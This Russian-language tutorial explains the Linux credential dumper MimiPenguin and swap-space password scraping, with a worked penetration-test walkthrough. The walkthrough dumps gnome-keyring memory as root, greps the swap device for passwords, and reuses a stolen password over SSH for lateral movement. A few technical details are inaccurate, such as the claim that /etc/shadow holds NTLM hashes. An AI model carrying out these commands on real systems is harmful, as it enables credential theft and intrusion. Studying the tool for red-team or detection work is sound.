# Извлечение учётных данных на Linux с помощью MimiPenguin: Архитектура, Механизмы и Детекция

## Контекст и базовые понятия

MimiPenguin (инструмент MITRE ATT&CK ID: S0179) представляет собой утилиту для сбора учётных данных (credential dumper), разработанную для операционных систем семейства Linux. Инструмент является прямым аналогом популярной утилиты Mimikatz для Windows, адаптированным под архитектуру и механизмы хранения памяти в Unix-подобных системах. Основная задача MimiPenguin — извлечение паролей в открытом виде (cleartext) из оперативной памяти процессов, которые в процессе своей работы вынуждены хранить учётные данные в незашифрованном или слабо защищённом виде.

В отличие от инструментов, направленных на кражу хешей паролей (например, `chntpw` или `samdump2` для Windows, или `john`/`hashcat` для оффлайн-атак на `/etc/shadow`), MimiPenguin работает в режиме реального времени (live-memory). Это означает, что для успешной эксплуатации необходимо наличие активного сеанса аутентификации или процесса, который в данный момент использует пароль. Если процесс завершён, а память очищена (zeroed out), извлечение становится невозможным без использования дополнительных методов, таких как анализ файла подкачки (swap space).

Ключевое разграничение в данной теме проводится между тремя классами инструментов и методов работы с учётными данными на Linux:

1.  **Инструменты оффлайн-анализа (Offline Hash Dumpers):** Работают с файлами `/etc/shadow` или дампами баз данных. Требуют доступа к файловой системе, но не требуют наличия запущенных процессов. Примеры: `john`, `hashcat`, `unshadow`.
2.  **Инструменты анализа памяти (Live Memory Dumpers):** Извлекают данные из RAM запущенных процессов. Требуют прав root (или доступа к `/proc/<pid>/mem`) и наличия активных сессий. Примеры: `MimiPenguin`, `mimikatz` (через Wine/кросс-платформенные порты, хотя нативных аналогов меньше), `gcore` + `strings`.
3.  **Инструменты анализа хранилищ (Keyring/Store Dumpers):** Специализируются на извлечении ключей из специфических менеджеров паролей (GNOME Keyring, KWallet, KeePassXC) через их API или дампы памяти. MimiPenguin частично пересекается с этим классом, но делает акцент на «сыром» поиске строк в памяти, а не на дешифровке защищённых контейнеров.

| Характеристика | MimiPenguin (Live Memory) | /etc/shadow (Offline Hash) | Swap Digger (Hybrid) |
| :--- | :--- | :--- | :--- |
| **Источник данных** | RAM активных процессов (`/proc/<pid>/mem`) | Файловая система (`/etc/shadow`) | Swap-файл/раздел (`/dev/sdaX`) |
| **Формат извлечения** | Cleartext (открытый текст) | NTLM/SHA-1/SHA-512 хеши | Cleartext (поиск строк) |
| **Требования к среде** | Запущенные сервисы (SSH, FTP, GDM) | Доступ к файлу shadow | Наличие swap-пространства |
| **Необходимые права** | Root (или CAP_SYS_PTRACE) | Root | Root |
| **Зависимость от времени** | Высокая (нужна активная сессия) | Низкая (данные статичны) | Средняя (данные могут быть перезаписаны) |
| **Типичное применение** | Пост-эксплуатация, Red Team | Форензика, оффлайн-брутфорс | Форензика, глубокий анализ инцидента |

MimiPenguin не является универсальным решением для всех сценариев. Его эффективность критически зависит от того, какие приложения запущены на целевой системе. Например, если на сервере нет графической оболочки (headless server) и не используются FTP/HTTP Basic Auth, стандартные «иглы» (needles) MimiPenguin могут не найти ничего. В таких случаях инструмент теряет свою ценность, и специалист должен переключаться на анализ swap-пространства или использование других техник MITRE T1003.007 (OS Credential Dumping: Proc Filesystem).

## Внутреннее устройство предмета

Архитектура MimiPenguin базируется на трёх основных компонентах: сборщике процессов (process enumerator), анализаторе памяти (memory scanner) и валидаторе (validator). Инструмент доступен в двух реализациях: на Bash (`.sh`) и на Python (`.py`), а также в виде скомпилированного бинарного файла на C (версия 2.0+). Выбор реализации влияет на производительность и поддерживаемые функции, но логика работы остаётся идентичной.

### Механизм сбора и анализа памяти

Процесс извлечения данных состоит из следующих этапов:

1.  **Enumerate (Перечисление):** Скрипт сканирует `/proc` для получения списка активных процессов. Он фильтрует их по известным именам (GDM, Gnome Keyring, sshd, vsftpd, apache2) и их PID.
2.  **Dump (Дамп):** Для каждого целевого процесса инструмент использует системный вызов `ptrace` (через `gcore` в bash-версии или напрямую в C-версии) для создания дампа памяти процесса. В более новых реализациях используется прямой доступ к файлу `/proc/<PID>/mem`, что позволяет читать память без остановки процесса.
3.  **Scan (Поиск):** Полученный дамп (или поток памяти) просматривается с помощью утилиты `strings` (в bash-версии) или собственных функций поиска строк (в C-версии). Ищутся паттерны, похожие на пароли. Для GNOME Keyring это часто строки, начинающиеся с определённых префиксов или содержащие специфические структуры данных.
4.  **Validate (Валидация):** Это ключевой этап, отличающий MimiPenguin от простого `strings`. Извлечённые кандидаты проверяются на вероятность того, что они являются паролями. Методы валидации включают:
    *   Сравнение с хешами из `/etc/shadow` (если доступен).
    *   Проверку наличия строки в памяти других процессов (корреляция).
    *   Использование регулярных выражений (regex) для фильтрации мусора.

### Поддерживаемые источники (Needles)

MimiPenguin поддерживает извлечение данных из следующих источников. Эффективность каждого зависит от версии ОС и конфигурации сервиса.

| Источник | Механизм извлечения | Условия успеха | Статус поддержки (по умолчанию) |
| :--- | :--- | :--- | :--- |
| **GDM (GNOME Display Manager)** | Поиск строк в памяти процесса `gdm3` или `lightdm`. | Активная сессия входа в систему. | Высокая (для десктопов) |
| **GNOME Keyring** | Анализ памяти `gnome-keyring-daemon`. Поиск зашифрованных/незашифрованных ключей. | Пользователь авторизован в десктопе. | Высокая |
| **VSFTPd** | Поиск строк `USER` и `PASS` в памяти процесса `vsftpd`. | Активное FTP-подключение. | Средняя |
| **Apache2** | Поиск заголовков `Authorization: Basic ...` в памяти процесса `apache2`/`httpd`. | Активные HTTP-сессии с Basic Auth. | Низкая (требует `gcore`) |
| **OpenSSH** | Поиск passphrase в памяти `ssh-agent` или данных `sudo`. | Активные SSH-сессии или использование `sudo`. | Средняя |
| **LightDM** | Аналогично GDM, для дистрибутивов Ubuntu/Xubuntu. | Активная сессия входа. | Высокая |

### Архитектурные ограничения и особенности

Важно понимать технические ограничения инструмента. Во-первых, MimiPenguin требует прав root. Без прав root чтение `/proc/<PID>/mem` невозможно из-за защиты `ptrace_scope` (обычно установлено в 1 или 2). Во-вторых, C-версия инструмента имеет известную проблему с архитектурой: 32-битный бинарный файл не может корректно искать в 64-битном адресном пространстве, что приводит к ложным отрицаниям. В-третьих, инструмент не является детерминированным: он выводит *кандидатов* на пароль, и специалист должен вручную или автоматически отфильтровать ложные срабатывания.

```text
[Алгоритм работы MimiPenguin]

1. Получить список PID процессов (ps aux / /proc)
   │
   ▼
2. Для каждого PID:
   ├── Проверить имя процесса (match with known needles)
   ├── Если совпадение:
   │    ├── Попытаться прочитать /proc/<PID>/mem
   │    └── Извлечь строки (strings / regex)
   │
   ▼
3. Фильтрация кандидатов:
   ├── Проверка на длину (min/max length)
   ├── Проверка на спецсимволы
   └── Проверка против /etc/shadow (если root)
   │
   ▼
4. Вывод результатов:
   [Username]: [Password Candidate]
   [Service]: [Credential]
```

## Применение и работа с предметом

На практике MimiPenguin используется в двух основных сценариях: тестирование на проникновение (Red Teaming) и инцидент-респонс (IR). В контексте пост-эксплуатации, после получения shell с правами root, специалист должен быстро оценить ценность системы. Если это десктопная машина, извлечение паролей от GNOME Keyring может дать доступ к другим сервисам (SSH, FTP, веб-панели). Если это сервер, анализ swap-пространства может выявить пароли, которые были очищены из памяти, но остались на диске.

### Запуск и базовые операции

Запуск инструмента прост, но требует понимания нюансов вывода. Python-версия (`mimipenguin.py`) считается более современной и стабильной, чем Bash-версия, так как она не зависит от внешних утилит вроде `gcore`, которые могут блокировать процесс.

```bash
# Клонирование репозитория
git clone https://github.com/huntergregal/mimipenguin.git
cd mimipenguin

# Запуск Python-версии (рекомендуется)
sudo python3 mimipenguin.py

# Альтернатива: запуск Bash-версии
sudo bash mimipenguin.sh
```

Вывод инструмента обычно содержит строки вида `Username: Password`. Однако, из-за природы памяти, в выводе часто присутствует «шум»: временные переменные, фрагменты кода, случайные последовательности байтов. Специалист должен уметь отличать реальные учётные данные от артефактов. Например, если пароль содержит только цифры и имеет длину 4 символа, это может быть PIN-код, а не пароль. Если пароль содержит спецсимволы и длинный — вероятность выше.

### Анализ Swap-пространства

Поскольку MimiPenguin работает только с активной памятью, он бесполезен, если процессы уже завершились. В этом случае применяется техника анализа swap-пространства. Swap используется ОС для выгрузки страниц памяти, когда RAM переполнена. Пароли, которые были в RAM, могут быть записаны в swap и оставаться там до перезагрузки или перезаписи.

Для анализа swap используется утилита `strings` напрямую к блочному устройству или файлу подкачки.

```bash
# Определение swap-устройства
swapon --show
# Или
cat /proc/swaps

# Пример вывода:
# NAME      TYPE      SIZE USED PRIO
# /dev/sda5 partition 2G   0B   -2

# Поиск паролей в swap
sudo strings /dev/sda5 | grep -i "password="
sudo strings /dev/sda5 | grep -i "passwd="
sudo strings /dev/sda5 | grep -E "^[A-Za-z0-9@._-]{8,}$"
```

Для автоматизации этого процесса существует инструмент `swap_digger` (автор: sevagas), который сканирует swap на наличие различных типов учётных данных: паролей Linux, ключей WiFi, HTTP Basic Auth, email-адресов из форм.

```bash
# Установка swap_digger
git clone https://github.com/sevagas/swap_digger.git
cd swap_digger
chmod +x swap_digger.sh

# Запуск с автоматическим поиском и извлечением
sudo ./swap_digger.sh -vx
```

### Ограничения и обход защиты

Современные дистрибутивы Linux внедряют механизмы защиты, снижающие эффективность MimiPenguin:

1.  **KASLR (Kernel Address Space Layout Randomization):** Хотя MimiPenguin не полагается на жёсткие адреса ядра, рандомизация адресного пространства пользователей усложняет предсказуемое расположение строк.
2.  **Secure Memory Clearing:** Некоторые приложения (например, современные браузеры или менеджеры паролей) явно очищают память после использования пароля, записывая нули или случайные данные.
3.  **Encrypted Swap:** Если swap зашифрован (например, через `dm-crypt`), извлечение данных становится невозможным без ключа шифрования.
4.  **Noexec/Nosuid:** Если swap-раздел смонтирован с флагом `noexec`, это не влияет на `strings`, но может ограничить выполнение вредоносного кода, если злоумышленник попытается внедрить shellcode в swap.

Для детекции использования MimiPenguin в SOC-средах следует мониторить создание дампов процессов через `ptrace` и чтение `/proc/<pid>/mem` не-системными процессами, а также запуск утилит `strings` на блочных устройствах.

## Сквозной практический пример: Извлечение паролей с десктопной рабочей станции

**Исходные условия:**
Проводится тестирование на проникновение в корпоративную сеть. Атакующий получил доступ к рабочей станции сотрудника на базе Ubuntu 20.04 LTS с графической оболочкой GNOME. У атакующего есть shell с правами `root` (например, через локальную эксплойт-уязвимость ядра). На машине активно используется GNOME Keyring для хранения паролей от SSH и FTP-клиентов. Задача: извлечь пароли текущего пользователя для горизонтального перемещения.

**Шаг 1: Подготовка и запуск MimiPenguin**

Атакующий загружает инструмент с атакующей машины или копирует его на целевую. Запускается Python-версия для максимальной совместимости.

```bash
# На целевой машине (root)
cd /tmp
git clone https://github.com/huntergregal/mimipenguin.git
cd mimipenguin
sudo python3 mimipenguin.py
```

**Ожидаемый вывод:**
Инструмент выводит список найденных кандидатов. В данном случае он находит пароль в памяти `gnome-keyring-daemon`.

```text
[+] Dumping gnome-keyring-daemon (PID: 1234)
[+] Found password: 'MyS3cur3P@ss!' for user 'john.doe'
[+] Dumping ssh-agent (PID: 5678)
[+] No password found in ssh-agent
[+] Dumping vsftpd (PID: 9012)
[+] No active FTP connections
```

**Шаг 2: Верификация и фильтрация**

Вывод MimiPenguin может содержать ложные срабатывания. Атакующий проверяет, существует ли пользователь `john.doe` и активен ли он.

```bash
# Проверка пользователя
id john.doe
# Вывод: uid=1000(john.doe) gid=1000(john.doe) groups=1000(john.doe),27(sudo)

# Проверка активности сессии
who
# Вывод: john.doe :0           2023-10-27 10:00 (:0)
```

**Шаг 3: Анализ Swap-пространства (если MimiPenguin не дал результатов)**

Предположим, что в первом запуске MimiPenguin не нашёл паролей (например, сессия GNOME Keyring была закрыта, но данные остались в swap). Атакующий переходит к анализу swap.

```bash
# Определение swap
cat /proc/swaps
# Вывод: /dev/sda2 partition 4194304 0 -1

# Поиск паролей в swap
sudo strings /dev/sda2 | grep -i "password" | head -20
```

**Ожидаемый вывод из swap:**
В swap могут быть найдены фрагменты данных, которые не были очищены.

```text
...
user=john.doe
password=MyS3cur3P@ss!
...
email=john.doe@corp.local
...
```

**Шаг 4: Использование полученного пароля**

Атакующий использует извлечённый пароль для доступа к другим системам.

```bash
# Попытка SSH-подключения к другому хосту в сети
ssh john.doe@192.168.1.50
# Ввод пароля: MyS3cur3P@ss!
# Успешный вход.
```

**Ожидаемый вывод:**
Пример демонстрирует, как MimiPenguin и анализ swap дополняют друг друга. MimiPenguin даёт быстрый доступ при активных сессиях, а swap-анализ позволяет получить данные даже после завершения процессов, что критично для полного сбора учётных данных в рамках пост-эксплуатации.

## Аналитический вывод

MimiPenguin представляет собой эффективный инструмент для извлечения учётных данных в сценариях пост-эксплуатации Linux-систем, особенно в десктопных средах с активным использованием GNOME Keyring и GDM. Его сила заключается в простоте использования и способности извлекать пароли в открытом виде из памяти активных процессов, что обходит механизмы хранения хешей. Однако, инструмент имеет существенные ограничения: он требует прав root, зависит от наличия активных сессий и не работает на headless-серверах без специфических сервисов.

Для полного покрытия сценария извлечения данных необходимо комбинировать MimiPenguin с анализом swap-пространства. Swap-анализ позволяет получить данные, которые были очищены из оперативной памяти, но остались на диске, что значительно расширяет арсенал атакующего. С точки зрения защиты, эффективность MimiPenguin подчёркивает важность использования зашифрованного swap, очистки памяти после использования паролей на уровне приложений и мониторинга доступа к `/proc/<pid>/mem`. В современных условиях, где многие сервисы переходят на использование токенов и ключей SSH вместо паролей, роль MimiPenguin снижается, но она остаётся критичной для атак на классические инфраструктуры и десктопные среды.
